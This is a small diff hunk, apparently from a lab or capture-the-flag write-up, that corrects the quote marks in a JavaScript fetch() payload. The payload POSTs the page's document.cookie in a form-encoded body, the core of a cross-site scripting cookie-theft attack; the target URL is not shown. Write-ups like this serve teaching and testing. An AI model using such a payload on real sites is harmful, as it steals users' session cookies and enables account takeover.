@@ -67,7 +67,7 @@ NOTE: In real world, once you enumerate the directory on both port, you'll see t
     "headers": {
         "Content-Type": "application/x-www-form-urlencoded"
     },
-    "body": “message=”+document.cookie,
+    "body": "message="+document.cookie,
     "method": "POST",
     "mode": "cors"
   });
